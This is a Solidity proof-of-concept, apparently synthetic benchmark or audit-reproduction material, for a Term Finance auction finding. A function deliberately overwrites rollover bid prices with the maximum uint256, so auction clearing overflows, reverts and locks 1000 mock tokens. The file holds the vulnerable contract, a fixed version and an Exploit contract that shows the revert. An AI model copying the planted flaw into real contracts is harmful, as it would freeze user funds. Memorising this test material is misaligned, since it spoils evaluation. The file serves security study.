// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Term Finance — rollover bids are overwritten to uint256 max
    (Sigma Prime, finding 26295).
    SYNTHETIC, cheatcode-free. _fillRevealedBidsForAuctionClearing stores
    type(uint256).max on a rollover bid (@> VULN). Clearing then adds that
    price to the offer and overflows, so the auction reverts. 1000 purchase
    tokens stay in the auction. The control keeps the submitted price of 120,
    clears at 110, and pays the 1000 out. */

contract MockToken {
    string public name = "PURCH";
    string public symbol = "PURCH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

struct Bid {
    bool isRollover;
    uint256 bidPriceRevealed;
}

contract TermAuction {
    MockToken public purchase;
    address public bidder;
    uint256 public clearingPrice;
    bool public cleared;

    constructor(address _purchase, address _bidder) {
        purchase = MockToken(_purchase);
        bidder = _bidder;
    }

    function _fillRevealedBidsForAuctionClearing(Bid memory bid) public pure returns (Bid memory) {
        if (bid.isRollover) {
            // @> VULN: the submitted rollover price is replaced with the maximum uint256
            bid.bidPriceRevealed = type(uint256).max;
        }
        return bid;
    }

    function _calculateClearingPrice(uint256 offerPrice, uint256 bidPrice) public returns (uint256) {
        uint256 finalClearingPrice = (offerPrice + bidPrice) / 2;
        clearingPrice = finalClearingPrice;
        return finalClearingPrice;
    }

    function clear(uint256 offerPrice, uint256 bidPrice) external {
        uint256 price = _calculateClearingPrice(offerPrice, bidPrice);
        purchase.transfer(bidder, purchase.balanceOf(address(this)));
        cleared = price > 0;
    }
}

contract TermAuctionFixed {
    MockToken public purchase;
    address public bidder;
    uint256 public clearingPrice;
    bool public cleared;

    constructor(address _purchase, address _bidder) {
        purchase = MockToken(_purchase);
        bidder = _bidder;
    }

    function _fillRevealedBidsForAuctionClearing(Bid memory bid) public pure returns (Bid memory) {
        // FIX: keep the price the rollover bid actually submitted
        return bid;
    }

    function _calculateClearingPrice(uint256 offerPrice, uint256 bidPrice) public returns (uint256) {
        uint256 finalClearingPrice = (offerPrice + bidPrice) / 2;
        clearingPrice = finalClearingPrice;
        return finalClearingPrice;
    }

    function clear(uint256 offerPrice, uint256 bidPrice) external {
        uint256 price = _calculateClearingPrice(offerPrice, bidPrice);
        purchase.transfer(bidder, purchase.balanceOf(address(this)));
        cleared = price > 0;
    }
}

contract Exploit {
    MockToken public purchase;
    TermAuction public auction;
    address public bidder;
    uint256 public constant AMOUNT = 1_000 ether;
    uint256 public constant OFFER = 100;
    uint256 public constant SUBMITTED = 120;

    constructor() {
        purchase = new MockToken();
        bidder = address(new Receiver());
        auction = new TermAuction(address(purchase), bidder);
    }

    function run() external {
        purchase.mint(address(auction), AMOUNT);
        Bid memory filled = auction._fillRevealedBidsForAuctionClearing(
            Bid({isRollover: true, bidPriceRevealed: SUBMITTED})
        );
        require(filled.bidPriceRevealed == type(uint256).max, "price is max");
        (bool ok,) = address(auction).call(
            abi.encodeWithSelector(auction.clear.selector, OFFER, filled.bidPriceRevealed)
        );
        require(!ok, "clear reverts");
        require(purchase.balanceOf(address(auction)) == AMOUNT, "1000 stuck");
        require(purchase.balanceOf(bidder) == 0, "bidder unpaid");
        require(auction.cleared() == false, "not cleared");
    }
}

contract Receiver {}
